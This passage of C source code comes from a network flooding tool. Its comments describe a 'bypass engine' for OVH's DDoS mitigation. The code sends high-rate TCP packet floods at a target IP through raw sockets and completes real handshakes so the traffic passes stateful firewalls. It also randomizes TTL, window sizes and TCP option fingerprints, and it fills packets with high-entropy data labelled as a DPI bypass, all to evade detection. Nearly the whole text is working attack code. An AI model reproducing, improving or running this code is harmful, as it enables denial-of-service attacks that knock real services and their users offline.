                    // IP header words: [0]=ver/ihl/tos, [1]=tot_len, [2]=id, [3]=frag, [4]=ttl/proto
                    //                  [5]=check, [6-7]=saddr, [8-9]=daddr
                    tiph->id = 0; tiph->ttl = 0; tiph->check = 0;
                    unsigned short *ipw = (unsigned short *)tiph;
                    ip_base_sum = ipw[0] + ipw[1] + ipw[3] + ipw[6] + ipw[7] + ipw[8] + ipw[9];
                    // Add protocol field (ttl=0, proto=TCP → htons(0x0006) but split across word[4])
                    ip_base_sum += htons(IPPROTO_TCP);  // word[4] with ttl=0
                    tiph->ttl = 64; // restore for template
                    
                    // TCP pseudo-header checksum base (excluding source, seq, ack_seq, check)
                    ttcph->source = 0; ttcph->seq = 0; ttcph->ack_seq = 0; ttcph->check = 0;
                    tls_base_sum = 0;
                    tls_base_sum += (tiph->saddr & 0xFFFF) + (tiph->saddr >> 16);
                    tls_base_sum += (tiph->daddr & 0xFFFF) + (tiph->daddr >> 16);
                    tls_base_sum += htons(IPPROTO_TCP);
                    tls_base_sum += htons(20 + tls_payload_len);
                    unsigned short *tps = (unsigned short *)(ttpl + sizeof(struct iphdr));
                    for (int k = 0; k < (20 + tls_payload_len) / 2; k++) tls_base_sum += tps[k];
                    
                    for (int b = 0; b < V18T_BATCH; b++) {
                        memcpy(tls_pkts[b], ttpl, tls_pkt_len);
                        iovs_tls[b].iov_len = tls_pkt_len;
                        iovs_tls[b].iov_base = tls_pkts[b];
                        msgs_tls[b].msg_hdr.msg_iov = &iovs_tls[b];
                        msgs_tls[b].msg_hdr.msg_iovlen = 1;
                        msgs_tls[b].msg_hdr.msg_name = &target_addr;
                        msgs_tls[b].msg_hdr.msg_namelen = sizeof(target_addr);
                    }
                    tls_inited = 1;
                    LOG_INFO("T%d: V18 TLS init OK, pkt_len=%d, raw_fd=%d", tid, tls_pkt_len, raw_fd);
                    fflush(stderr);
                }
                
                for (int b = 0; b < V18T_BATCH; b++) {
                    struct iphdr *iph = (struct iphdr *)tls_pkts[b];
                    struct tcphdr *tcph = (struct tcphdr *)(tls_pkts[b] + sizeof(struct iphdr));
                    
                    // Per-packet mutation: source port, seq, ack, IP ID
                    unsigned short sp = htons(1024 + (fast_rand() % 60000));
                    unsigned int seq = fast_rand();
                    unsigned int ack = fast_rand();
                    unsigned short new_id = htons(fast_rand() & 0xFFFF);
                    unsigned short ttl_val = 55 + (fast_rand() % 10);
                    
                    tcph->source = sp;
                    tcph->seq = htonl(seq);
                    tcph->ack_seq = htonl(ack);
                    iph->id = new_id;
                    iph->ttl = ttl_val;
                    
                    // Fast IP checksum: base + id + ttl_proto
                    unsigned int ic = ip_base_sum + new_id + htons((ttl_val << 8) | IPPROTO_TCP);
                    ic = (ic >> 16) + (ic & 0xFFFF); ic += (ic >> 16);
                    iph->check = (unsigned short)~ic;
                    
                    // Fast TCP checksum: base + source + seq + ack
                    unsigned int cs = tls_base_sum + sp;
                    cs += htons(seq >> 16); cs += htons(seq & 0xFFFF);
                    cs += htons(ack >> 16); cs += htons(ack & 0xFFFF);
                    cs = (cs >> 16) + (cs & 0xFFFF); cs += (cs >> 16);
                    tcph->check = (unsigned short)~cs;
                }
                
                int sent_count = sendmmsg(raw_fd, msgs_tls, V18T_BATCH, MSG_NOSIGNAL);
                if (sent_count > 0) {
                    for (int b = 0; b < sent_count; b++) {
                        thread_stats[tid].packets++;
                        thread_stats[tid].bytes += tls_pkt_len;
                    }
                } else if (sent_count < 0) {
                    if (errno == ENOBUFS || errno == EAGAIN) {
                        usleep(100);
                    }
                }
            }
        }
    }
    if (args.is_v17_tcp_bypass) {
        // === V18 OVH FULL BYPASS ENGINE ===
        // Strategy: ALL packets = full MTU 1514B for max Gbps/PPS
        //   Hot send loop: PSH+ACK + ACK + RST+ACK mix at 1460B payload
        //   Variable: TTL, window, src_port, seq, IP ID, payload type
        //   3WHS: dedicated recv thread reads SYN-ACK → sends ACK to complete handshake
        //         Once completed, slot marked ESTABLISHED -> passes stateful FW
        //   Result: 9+ Gbps + bypass OVH VAC stateful inspection

        int stealth = args.is_stealth;
        int nc=sysconf(_SC_NPROCESSORS_ONLN);
        cpu_set_t cset; CPU_ZERO(&cset);
        CPU_SET(tid%nc,&cset);
        pthread_setaffinity_np(pthread_self(),sizeof(cpu_set_t),&cset);

        unsigned int src_ip=get_local_ip();
        if(!src_ip){LOG_ERR("T%d: no IP",tid);return NULL;}

        char iface[32]={0};
        get_default_interface(iface,sizeof(iface));
        if(!iface[0]){LOG_ERR("T%d: no iface",tid);return NULL;}
        int ifindex=if_nametoindex(iface);

        unsigned char src_mac[6]={0};
        {char path[128];snprintf(path,sizeof(path),"/sys/class/net/%s/address",iface);
         FILE *f=fopen(path,"r");if(f){int m[6];
           if(fscanf(f,"%x:%x:%x:%x:%x:%x",&m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6)
             for(int i=0;i<6;i++) src_mac[i]=m[i];
           fclose(f);}}

        unsigned char gw_mac[6]={0};
        {unsigned int gw_ip=0;
         FILE *fr=fopen("/proc/net/route","r");
         if(fr){char ln[256];
           while(fgets(ln,sizeof(ln),fr)){char ri[32];unsigned long rd,rg;
             if(sscanf(ln,"%31s %lx %lx",ri,&rd,&rg)==3&&rd==0&&rg!=0){
               gw_ip=(unsigned int)rg;break;}}
           fclose(fr);}
         if(gw_ip){struct in_addr ga;ga.s_addr=gw_ip;
           char cmd[128];snprintf(cmd,sizeof(cmd),"ping -c1 -W1 %s>/dev/null 2>&1",inet_ntoa(ga));
           if(system(cmd)){} usleep(50000);
           FILE *fa=fopen("/proc/net/arp","r");
           if(fa){char ln[256];if(fgets(ln,sizeof(ln),fa)){}
             while(fgets(ln,sizeof(ln),fa)){char ai[64],am[64];int t,fl;
               if(sscanf(ln,"%63s 0x%x 0x%x %17s",ai,&t,&fl,am)>=4&&
                  inet_addr(ai)==gw_ip){
                 int m[6];if(sscanf(am,"%x:%x:%x:%x:%x:%x",
                                    &m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6)
                   for(int i=0;i<6;i++) gw_mac[i]=m[i];
                 break;}}
             fclose(fa);}}}

        int use_afp=1;
        int fd_send, fd_send2;
        if(use_afp){
            fd_send=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_IP));
            struct sockaddr_ll sl={0};
            sl.sll_family=AF_PACKET;sl.sll_ifindex=ifindex;sl.sll_protocol=htons(ETH_P_IP);
            bind(fd_send,(struct sockaddr*)&sl,sizeof(sl));
            int q=1;setsockopt(fd_send,SOL_PACKET,PACKET_QDISC_BYPASS,&q,sizeof(q));
            fd_send2=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_IP));
            bind(fd_send2,(struct sockaddr*)&sl,sizeof(sl));
            setsockopt(fd_send2,SOL_PACKET,PACKET_QDISC_BYPASS,&q,sizeof(q));
        } else {
            fd_send=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
            int h=1;setsockopt(fd_send,IPPROTO_IP,IP_HDRINCL,&h,sizeof(h));
            fd_send2=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
            setsockopt(fd_send2,IPPROTO_IP,IP_HDRINCL,&h,sizeof(h));
        }
        {int sb=64*1024*1024;
         setsockopt(fd_send,SOL_SOCKET,SO_SNDBUF,&sb,sizeof(sb));
         setsockopt(fd_send2,SOL_SOCKET,SO_SNDBUF,&sb,sizeof(sb));
        }

        struct sockaddr_ll dst_sll={0};
        dst_sll.sll_family=AF_PACKET;dst_sll.sll_ifindex=ifindex;
        dst_sll.sll_halen=6;memcpy(dst_sll.sll_addr,gw_mac,6);
        dst_sll.sll_protocol=htons(ETH_P_IP);

        // Raw socket fallback destination (used when GW MAC not available)
        struct sockaddr_in raw_dst={0};
        raw_dst.sin_family=AF_INET;
        raw_dst.sin_addr.s_addr=bin_target_ip;
        raw_dst.sin_port=bin_target_port; // not used by kernel for IPPROTO_RAW

        // Recv socket for SYN-ACK (3WHS completion)
        int fd_recv=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_IP));
        {
            struct sock_filter bpf_syn_ack[] = {
                { 0x28, 0, 0, 0x0000000c },
                { 0x15, 0, 5, 0x00000800 },
                { 0x30, 0, 0, 0x00000017 },
                { 0x15, 0, 3, 0x00000006 },
                { 0x28, 0, 0, 0x00000014 },
                { 0x45, 1, 0, 0x00001fff },
                { 0xb1, 0, 0, 0x0000000e },
                { 0x50, 0, 0, 0x0000001b },
                { 0x54, 0, 0, 0x00000012 },
                { 0x15, 0, 1, 0x00000012 },
                { 0x6, 0, 0, 0x00040000 },
                { 0x6, 0, 0, 0x00000000 },
            };
            struct sock_fprog prog={sizeof(bpf_syn_ack)/sizeof(bpf_syn_ack[0]),bpf_syn_ack};
            setsockopt(fd_recv,SOL_SOCKET,SO_ATTACH_FILTER,&prog,sizeof(prog));
            int rb=512*1024; setsockopt(fd_recv,SOL_SOCKET,SO_RCVBUF,&rb,sizeof(rb));
        }

        // === CONSTANTS ===
        #define V17B_MAX 16384
        #define V17ETH   14
        #define V17IP    20
        #define V17TCP   20
        #define V17TCP_TS 32
        #define V17PL   1440
        #define V17FLEN (V17ETH+V17IP+V17TCP_TS+V17PL)
        #define HUGE_PL_SIZE (1024 * 1024)
        int V17B = 256; // Proven 80Gbps config

        // Slot state
        #define ST_SYN_SENT    0
        #define ST_ESTABLISHED 1
        #define ST_FORCE_EST   2

        // Force real 3WHS: FW MUST create state entry for each connection
        int SYN_MAX_RETRY = 10; // After this many SYN without SYN-ACK, force stateless

        // No ramp — full power from round 1
        #define SOFT_START_ROUNDS 1



        // TTL table (expanded: Linux/Win/Mac/FreeBSD/Cisco/Solaris/AIX)
        static const unsigned char ttl_t[]={
            64,64,64,63,128,128,64,117,255,63,64,128,64,60,
            64,128,64,64,117,64,64,128,64,63,255,64,60,128,
            64,63,128,255,64,64,128,64};
        int ttl_sz=sizeof(ttl_t);

        // Window table (expanded: more OS fingerprints)
        static const unsigned short win_t[]={
            8192,16384,32768,65535,29200,14600,43690,
            26880,8760,32120,16060,26280,65535,4096,
            28960,14480,5840,5792,65520,64240,32767};
        int win_sz=(int)(sizeof(win_t)/sizeof(win_t[0]));

        // Allocate per-slot data (heap, not stack)
        unsigned char (*vbuf)[V17FLEN]=malloc(V17B_MAX*V17FLEN);
        struct mmsghdr *vmsg=calloc(V17B_MAX,sizeof(struct mmsghdr));
        struct iovec   *viov=calloc(V17B_MAX,sizeof(struct iovec));
        unsigned int *tcp_base=calloc(V17B_MAX,sizeof(unsigned int));
        unsigned int *ip_base =calloc(V17B_MAX,sizeof(unsigned int));
        unsigned int *slot_seq=calloc(V17B_MAX,sizeof(unsigned int));
        unsigned int *slot_ack=calloc(V17B_MAX,sizeof(unsigned int));
        unsigned short*slot_sp=calloc(V17B_MAX,sizeof(unsigned short));
        int           *slot_st=calloc(V17B_MAX,sizeof(int));
        unsigned int  *slot_rn=calloc(V17B_MAX,sizeof(unsigned int));
        unsigned int  *slot_syn_sent=calloc(V17B_MAX,sizeof(unsigned int));
        unsigned char *slot_ttl=calloc(V17B_MAX,sizeof(unsigned char));
        unsigned short*slot_win=calloc(V17B_MAX,sizeof(unsigned short));
        unsigned char *slot_tls_ver=calloc(V17B_MAX,sizeof(unsigned char));
        unsigned char *slot_ch_sent=calloc(V17B_MAX,sizeof(unsigned char));
        unsigned int  *slot_tsval=calloc(V17B_MAX,sizeof(unsigned int));
        unsigned int  *slot_tsecr=calloc(V17B_MAX,sizeof(unsigned int));
        unsigned int  *slot_pl_sum=calloc(V17B_MAX,sizeof(unsigned int));

        // Huge Payload Buffer for O(1) random data & DPI bypass
        unsigned char *huge_pl_buf = malloc(HUGE_PL_SIZE);
        unsigned int *huge_pl_sum = calloc(HUGE_PL_SIZE / 2 + 1, sizeof(unsigned int));
        if(!huge_pl_buf || !huge_pl_sum) {
            LOG_ERR("T%d: HUGE_PL_SIZE malloc failed", tid);
            return NULL;
        }

        // Init Huge Buffer & Prefix Sum with High Entropy Random Data for L4 Bypass
        unsigned int current_sum = 0;
        unsigned short *hpw = (unsigned short *)huge_pl_buf;
        huge_pl_sum[0] = 0;
        for (int k = 0; k < HUGE_PL_SIZE / 2; k++) {
            hpw[k] = (unsigned short)(fast_rand() & 0xFFFF);
            current_sum += hpw[k];
            huge_pl_sum[k + 1] = current_sum;
        }

        // sport→slot lookup for recv processing (full random range now)
        int *port_to_slot = malloc(65536 * sizeof(int));
        for(int i=0; i<65536; i++) port_to_slot[i] = -1;        // Initialize all slots
        for(int b=0;b<V17B;b++){
            memset(vbuf[b],0,V17FLEN);
            unsigned char *fr=vbuf[b];

            // Ethernet
            if(use_afp){memcpy(fr,gw_mac,6);memcpy(fr+6,src_mac,6);fr[12]=8;fr[13]=0;}

            // IP
            struct iphdr *ih=(struct iphdr*)(fr+V17ETH);
            ih->ihl=5;ih->version=4;ih->tot_len=htons(V17IP+V17TCP+V17PL);
            ih->frag_off=(fast_rand()%10<7)?htons(0x4000):0; // 70% DF set, 30% no DF (anti-fingerprint)
            ih->ttl=ttl_t[b%ttl_sz];
            ih->protocol=IPPROTO_TCP;
            ih->saddr=src_ip; ih->daddr=bin_target_ip;

            // TCP RST bypass — mixed flags
            struct tcphdr *th=(struct tcphdr*)(fr+V17ETH+V17IP);
            unsigned short p;
            do { p = (unsigned short)(1024 + (fast_rand() % 64000)); } while(port_to_slot[p] != -1);
            slot_sp[b]=p;
            port_to_slot[p]=b;
            slot_seq[b]=fast_rand();
            slot_ack[b]=fast_rand();
            // 100% stateful 3WHS — FW creates real session entries, won't drop data
            slot_st[b]=ST_SYN_SENT;
            slot_rn[b]=b;
            slot_ttl[b]=ttl_t[fast_rand()%ttl_sz]; // Fixed TTL per connection
            slot_win[b]=win_t[fast_rand()%win_sz]; // Fixed window per connection
            unsigned char tls_v_choices[] = {0x01, 0x03, 0x03}; // TLS 1.0, 1.2, 1.2
            slot_tls_ver[b]=tls_v_choices[fast_rand()%3]; // Fixed TLS version per connection
            slot_ch_sent[b]=0; // ClientHello not yet sent
            slot_tsval[b]=fast_rand(); // Initial timestamp value
            slot_pl_sum[b]=0;

            th->source=htons(slot_sp[b]);
            th->dest=bin_target_port;
            th->doff=5;th->psh=1;th->ack=1;
            th->seq=htonl(slot_seq[b]);
            th->ack_seq=htonl(slot_ack[b]);
            th->window=htons(win_t[b%win_sz]);

            // Build payload pointer (but don't copy yet, use L1 shared buffers)
            unsigned char *pl=fr+V17ETH+V17IP+V17TCP;

            // Pre-compute TCP checksum base (exclude: sport, seq, ack, window, flags, len, payload)
            unsigned short *tw=(unsigned short*)th;
            unsigned int cs=0;
            cs+=(src_ip&0xFFFF)+(src_ip>>16);
            cs+=(bin_target_ip&0xFFFF)+(bin_target_ip>>16);
            cs+=htons(IPPROTO_TCP);
            cs+=tw[1]; // dport (fixed)
            tcp_base[b]=cs;



            // Pre-compute IP checksum base (exclude: tot_len, id, check)
            unsigned short *iw=(unsigned short*)ih;
            unsigned int ipttlproto=(unsigned int)(ih->ttl<<8|IPPROTO_TCP);
            ip_base[b]=iw[0]+iw[3]+htons(ipttlproto)+iw[6]+iw[7]+iw[8]+iw[9];


            viov[b].iov_base=use_afp?fr:(fr+V17ETH);
            viov[b].iov_len=use_afp?V17FLEN:(V17IP+V17TCP+V17PL);
            vmsg[b].msg_hdr.msg_iov=&viov[b];
            vmsg[b].msg_hdr.msg_iovlen=1;
            vmsg[b].msg_hdr.msg_name=use_afp?(void*)&dst_sll:(void*)&raw_dst;
            vmsg[b].msg_hdr.msg_namelen=use_afp?sizeof(dst_sll):sizeof(raw_dst);
        }

        LOG_INFO("T%d: v17 OVH-BYPASS iface=%s mode=%s batch=%d pkt=%d",
                 tid,iface,use_afp?"AF_PACKET":"RAW",V17B,use_afp?V17FLEN:V17IP+V17TCP+V17PL);
        fflush(stdout); // force log output

        // === RECV + SYN BUFFERS on HEAP (avoid stack overflow with 8 threads) ===
        unsigned char *recv_buf = malloc(4096);
        unsigned char *syn_buf  = malloc(V17FLEN);
        unsigned char *ack_buf  = malloc(V17FLEN); // reused per SYN-ACK response
        if(!recv_buf||!syn_buf||!ack_buf){
            LOG_ERR("T%d: malloc failed",tid);
            return NULL;
        }
        memset(syn_buf,0,V17FLEN);
        if(use_afp){memcpy(syn_buf,gw_mac,6);memcpy(syn_buf+6,src_mac,6);
                    syn_buf[12]=8;syn_buf[13]=0;}
        {struct iphdr *ih2=(struct iphdr*)(syn_buf+V17ETH);
         ih2->ihl=5;ih2->version=4;ih2->tot_len=htons(V17IP+40); // 20 TCP options
         ih2->frag_off=htons(0x4000);ih2->ttl=128;ih2->protocol=IPPROTO_TCP; // Win10 TTL=128
         ih2->saddr=src_ip;ih2->daddr=bin_target_ip;
         struct tcphdr *th2=(struct tcphdr*)(syn_buf+V17ETH+V17IP);
         th2->doff=10;th2->syn=1;th2->dest=bin_target_port;
         th2->window=htons(64240); // Win10 SYN Window
         
         // TCP options: MSS=1460, SACK_PERM, TS, WScale=8 (Real Win10 Fingerprint)
         unsigned char *op=syn_buf+V17ETH+V17IP+20;
         op[0]=2; op[1]=4; op[2]=0x05; op[3]=0xb4; // MSS 1460
         op[4]=1; op[5]=3; op[6]=3; op[7]=8;       // NOP, WScale 8
         op[8]=1; op[9]=1; op[10]=4; op[11]=2;     // NOP, NOP, SACK Permitted
         op[12]=8; op[13]=10;                      // Timestamp Option
         *((unsigned int*)(op+14)) = fast_rand();  // TSVal (will be updated per packet)
         *((unsigned int*)(op+18)) = 0;            // TSecr = 0 for SYN
        }
         
        // Setup ACK Buffer (Pure ACK, No Payload)
        memset(ack_buf,0,V17FLEN);
        if(use_afp){memcpy(ack_buf,gw_mac,6);memcpy(ack_buf+6,src_mac,6);
                    ack_buf[12]=8;ack_buf[13]=0;}
        {struct iphdr *ih3=(struct iphdr*)(ack_buf+V17ETH);
         ih3->ihl=5;ih3->version=4;ih3->tot_len=htons(V17IP+V17TCP);
         ih3->frag_off=htons(0x4000);ih3->ttl=64;ih3->protocol=IPPROTO_TCP;
         ih3->saddr=src_ip;ih3->daddr=bin_target_ip;
         struct tcphdr *th3=(struct tcphdr*)(ack_buf+V17ETH+V17IP);
         th3->doff=5;th3->ack=1;th3->dest=bin_target_port;
         th3->window=htons(65535);}


        struct mmsghdr *vmsg_heap = calloc(V17B, sizeof(struct mmsghdr));
        unsigned int round=0;
        // Pulse timing for stealth mode
        long long pulse_start_ms = get_ms();
        int pulse_on_ms = 800 + (fast_rand() % 400);   // 0.8-1.2s ON (under VAC 2s detect)
        int pulse_off_ms = 300 + (fast_rand() % 300);   // 0.3-0.6s OFF (reset VAC counter)
        int pulse_phase = 1; // 1=ON, 0=OFF
        // Main attack loop

        while(1){
            round++;
            // Ultra-fast pulse: ON ends before VAC triggers, OFF resets detection
            // Stealth pulse removed — full power always
            // === STATEFUL MODE: 3-Way Handshake ===
            // 1. Send SYN (with soft start: stagger over ~3 seconds)
            for(int b=0;b<V17B;b++){
                if(slot_st[b]==ST_SYN_SENT){
                    // Soft start: don't activate slot until its wave arrives
                    unsigned int activate_round = (unsigned int)((unsigned long long)b * SOFT_START_ROUNDS / V17B);
                    if(round < activate_round) continue;

                    // SYN retry every 3 rounds (simple, fast)
                    if(round - slot_syn_sent[b] < 3 && slot_syn_sent[b] != 0) continue;
                    slot_syn_sent[b] = round;
                    slot_rn[b]++; // Count SYN attempts

                    // HYBRID: After SYN_MAX_RETRY failed SYN attempts, force-promote to stateless
                    if(slot_rn[b] >= SYN_MAX_RETRY) {
                        slot_st[b] = ST_FORCE_EST;
                        slot_seq[b] = fast_rand();
                        slot_ack[b] = fast_rand();
                        continue;
                    }

                    struct iphdr *ih2=(struct iphdr*)(syn_buf+V17ETH);
                    ih2->id=htons(fast_rand()&0xFFFF);
                    ih2->check=0;
                    unsigned int ic2=0;
                    unsigned short *iw2 = (unsigned short*)ih2;
                    for(int i=0; i<10; i++) ic2 += iw2[i];
                    ic2 = (ic2>>16)+(ic2&0xFFFF); ic2 += (ic2>>16);
                    ih2->check = (unsigned short)~ic2;

                    struct tcphdr *th2=(struct tcphdr*)(syn_buf+V17ETH+V17IP);
                    th2->source=htons(slot_sp[b]);
                    th2->seq=htonl(slot_seq[b]);
                    th2->check=0;
                    
                    // Randomize TCP Options per connection to bypass SYN Fingerprinting
                    unsigned char *op = syn_buf+V17ETH+V17IP+20;
                    int opt_len = 0;
                    unsigned int r_opt = fast_rand() % 4; // 4 different OS profiles

                    if (r_opt == 0) {
                        // Windows/Chrome profile: MSS=1460, SACK, TS, WScale=8
                        op[0]=2;op[1]=4;op[2]=0x05;op[3]=0xB4; // MSS=1460
                        op[4]=4;op[5]=2;                       // SACK
                        op[6]=8;op[7]=10;                      // Timestamps (value filled later if needed, left 0 for now)
                        *((unsigned int*)(op+8)) = fast_rand(); // Random TS val
                        *((unsigned int*)(op+12)) = 0;         // TS echo reply
                        op[16]=1;op[17]=3;op[18]=3;op[19]=8;   // NOP, WScale=8
                        opt_len = 20;
                    } else if (r_opt == 1) {
                        // Linux profile: MSS=1440, SACK, TS, WScale=7
                        op[0]=2;op[1]=4;op[2]=0x05;op[3]=0xA0; // MSS=1440
                        op[4]=4;op[5]=2;                       // SACK
                        op[6]=8;op[7]=10;                      // Timestamps
                        *((unsigned int*)(op+8)) = fast_rand();
                        *((unsigned int*)(op+12)) = 0;
                        op[16]=1;op[17]=3;op[18]=3;op[19]=7;   // NOP, WScale=7
                        opt_len = 20;
                    } else if (r_opt == 2) {
                        // iOS/Safari profile: MSS=1400, NOP, WScale=6, NOP, NOP, TS, SACK, EOL
                        op[0]=2;op[1]=4;op[2]=0x05;op[3]=0x78; // MSS=1400
                        op[4]=1;op[5]=3;op[6]=3;op[7]=6;       // NOP, WScale=6
                        op[8]=1;op[9]=1;op[10]=8;op[11]=10;    // NOP, NOP, TS
                        *((unsigned int*)(op+12)) = fast_rand();
                        *((unsigned int*)(op+16)) = 0;
                        op[20]=4;op[21]=2;op[22]=0;op[23]=0;   // SACK, EOL (requires 24 bytes options)
                        opt_len = 24;
                    } else {
                        // Basic profile (e.g. IoT/Simple stack): MSS=1460, NOP, WScale=4
                        op[0]=2;op[1]=4;op[2]=0x05;op[3]=0xB4; // MSS=1460
                        op[4]=1;op[5]=3;op[6]=3;op[7]=4;       // NOP, WScale=4
                        op[8]=0;op[9]=0;op[10]=0;op[11]=0;     // EOL padding
                        opt_len = 12; // 12 bytes options
                    }
                    
                    // Adjust IP and TCP header lengths based on random options
                    ih2->tot_len=htons(V17IP+20+opt_len);
                    th2->doff=(20+opt_len)/4;

                    // Recalculate IP Checksum with new tot_len
                    ih2->check=0;
                    ic2=0;
                    for(int i=0; i<10; i++) ic2 += iw2[i];
                    ic2 = (ic2>>16)+(ic2&0xFFFF); ic2 += (ic2>>16);
                    ih2->check = (unsigned short)~ic2;

                    // Recalculate TCP Checksum with new options
                    th2->check=0;
                    unsigned short *tw2 = (unsigned short*)th2;
                    unsigned int cs2 = (src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)+htons(IPPROTO_TCP)+htons(20+opt_len);
                    for(int i=0; i<(20+opt_len)/2; i++) cs2 += tw2[i]; 
                    cs2 = (cs2>>16)+(cs2&0xFFFF); cs2 += (cs2>>16);
                    th2->check = (unsigned short)~cs2;
                    
                    if(use_afp){
                        int s = sendto(fd_send,syn_buf,V17ETH+V17IP+20+opt_len,0,(struct sockaddr*)&dst_sll,sizeof(dst_sll));
                        // (Removed to prevent log spam)
                    } else {
                        int s = sendto(fd_send,syn_buf+V17ETH,V17IP+20+opt_len,0,(struct sockaddr*)&raw_dst,sizeof(raw_dst));
                        if(round==1 && b==0) { LOG_INFO("T%d: sendto AF_INET SYN returned %d (err: %s)", tid, s, strerror(errno)); fflush(stdout); }
                    }
                }
            }

            // 2. Recv SYN-ACK
            int rcvd=0;
            while((rcvd=recv(fd_recv,recv_buf,4096,MSG_DONTWAIT))>0){
                if(rcvd<V17ETH+V17IP+20) continue;
                struct iphdr *rih=(struct iphdr*)(recv_buf+V17ETH);
                if(rih->protocol!=IPPROTO_TCP) continue;
                struct tcphdr *rth=(struct tcphdr*)(recv_buf+V17ETH+(rih->ihl<<2));
                if(!(rth->syn && rth->ack)) continue;
                unsigned short dport=ntohs(rth->dest);
                
                int b = port_to_slot[dport];
                if(b >= 0 && slot_st[b]==ST_SYN_SENT){
                    slot_ack[b]=ntohl(rth->seq)+1;
                    slot_seq[b]++;
                    
                    unsigned int server_tsval = 0;
                    int r_opt_len = (rth->doff * 4) - 20;
                    unsigned char *r_opt = (unsigned char *)rth + 20;
                    for (int i = 0; i < r_opt_len; ) {
                        if (r_opt[i] == 0) break;
                        if (r_opt[i] == 1) { i++; continue; }
                        if (r_opt[i] == 8 && r_opt[i+1] == 10 && i + 9 < r_opt_len) {
                            server_tsval = *((unsigned int*)(r_opt + i + 2));
                            break;
                        }
                        i += r_opt[i+1];
                    }

                    struct iphdr *ih3=(struct iphdr*)(ack_buf+V17ETH);
                    ih3->id=htons(fast_rand()&0xFFFF);
                    
                    int ack_opt_len = 0;
                    if (server_tsval != 0) {
                        unsigned char *op3 = ack_buf+V17ETH+V17IP+20;
                        op3[0]=1; op3[1]=1;
                        op3[2]=8; op3[3]=10;
                        *((unsigned int*)(op3+4)) = htonl(slot_tsval[b]);
                        *((unsigned int*)(op3+8)) = server_tsval;
                        slot_tsecr[b] = server_tsval; // Save server TSval for echo in data packets
                        slot_tsval[b]++;
                        ack_opt_len = 12;
                    }
                    
                    ih3->tot_len=htons(V17IP+20+ack_opt_len);
                    struct tcphdr *th3=(struct tcphdr*)(ack_buf+V17ETH+V17IP);
                    th3->source=htons(slot_sp[b]);
                    th3->seq=htonl(slot_seq[b]);
                    th3->ack_seq=htonl(slot_ack[b]);
                    th3->doff=(20+ack_opt_len)/4;
                    
                    ih3->check=0;
                    unsigned int ic3=0;
                    unsigned short *iw3 = (unsigned short*)ih3;
                    for(int i=0; i<10; i++) ic3 += iw3[i];
                    ic3 = (ic3>>16)+(ic3&0xFFFF); ic3 += (ic3>>16);
                    ih3->check = (unsigned short)~ic3;

                    th3->check=0;
                    unsigned short *tw3 = (unsigned short*)th3;
                    unsigned int cs3 = (src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)+htons(IPPROTO_TCP)+htons(20+ack_opt_len);
                    for(int i=0; i<(20+ack_opt_len)/2; i++) cs3 += tw3[i]; 
                    cs3 = (cs3>>16)+(cs3&0xFFFF); cs3 += (cs3>>16);
                    th3->check = (unsigned short)~cs3;
                    
                    if(use_afp){
                        sendto(fd_send,ack_buf,V17ETH+V17IP+20+ack_opt_len,0,(struct sockaddr*)&dst_sll,sizeof(dst_sll));
                    } else {
                        sendto(fd_send,ack_buf+V17ETH,V17IP+20+ack_opt_len,0,(struct sockaddr*)&raw_dst,sizeof(raw_dst));
                    }
                    slot_st[b]=ST_ESTABLISHED;
                    slot_ch_sent[b]=0;
                }
            }

            // === HOT SEND LOOP ===
            struct mmsghdr *vmsg_active = vmsg_heap;
            int valid_pkts = 0;
            
            for(int b=0;b<V17B;b++){
                // Blast on ESTABLISHED or FORCE_EST
                if(slot_st[b] != ST_ESTABLISHED && slot_st[b] != ST_FORCE_EST){
                    if(slot_syn_sent[b] >= SYN_MAX_RETRY) {
                        slot_st[b] = ST_FORCE_EST;
                        slot_ack[b] = fast_rand();
                    } else {
                        continue;
                    }
                }
                unsigned char *fr=vbuf[b];
                struct iphdr *ih=(struct iphdr*)(fr+V17ETH);
                struct tcphdr *th=(struct tcphdr*)(fr+V17ETH+V17IP);
                unsigned short *tw=(unsigned short*)th;

                unsigned int current_pl;
                unsigned short flags;
                unsigned int churn_threshold;

                slot_rn[b]++;

                // Connection recycling: silent port rotation (NO RST — RST triggers FW block)
                if(slot_rn[b] > (3000 + (fast_rand() % 5000))) {
                    slot_rn[b] = 0;
                    slot_seq[b] = fast_rand();
                    slot_ack[b] = fast_rand();
                    slot_sp[b] = (unsigned short)(1024 + (fast_rand() % 64000));
                    slot_ttl[b] = ttl_t[fast_rand() % ttl_sz];
                    slot_win[b] = win_t[fast_rand() % win_sz];
                    slot_ch_sent[b] = 0;
                    slot_tsval[b] = fast_rand();
                    slot_tsecr[b] = 0;
                    th->source = htons(slot_sp[b]);
                }

                // Skip ClientHello, go straight to raw data
                unsigned int pl_sum_ch = 0;
                slot_ch_sent[b] = 1;

                // 100% PSH+ACK — matches real OS behavior, OVH expects this
                flags = (V17TCP_TS/4)<<12 | 0x018; // doff=8 (32 bytes TCP header), PSH+ACK
                th->psh=1; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
                th->doff = V17TCP_TS/4; // 8 = 32 bytes

                // TCP Timestamps — CRITICAL for OVH bypass (must match SYN options)
                unsigned char *opt = fr + V17ETH + V17IP + 20;
                opt[0]=1; opt[1]=1; // NOP, NOP
                opt[2]=8; opt[3]=10; // Timestamp option kind=8, len=10
                slot_tsval[b] += 100 + (fast_rand() % 50); // Realistic TSval increment
                *((unsigned int*)(opt+4)) = htonl(slot_tsval[b]);
                *((unsigned int*)(opt+8)) = slot_tsecr[b]; // Echo server timestamp

                // Payload Size: 1200-1428 (adjusted for 12-byte TS option overhead)
                unsigned int raw_pl = 1200 + (fast_rand() % 228);
                if(raw_pl & 1) raw_pl++; // Keep even for checksum
                current_pl = raw_pl;
                tw[6] = htons(flags);
                
                // High Entropy Payload & O(1) Checksum
                unsigned char *pl = fr + V17ETH + V17IP + V17TCP_TS;
                unsigned int pl_offset = (fast_rand() % (HUGE_PL_SIZE - current_pl)) & ~1;
                memcpy(pl, huge_pl_buf + pl_offset, current_pl);
                
